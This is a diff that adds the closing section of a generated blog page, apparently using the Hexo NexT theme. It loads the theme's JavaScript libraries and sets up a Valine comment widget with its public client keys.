+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '3Gsw5f8XgWFW3Nqp9vsH6tdw-gzGzoHsz',
+        appKey: 'm50DnD6XQWPqgcrmOWCu055t',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
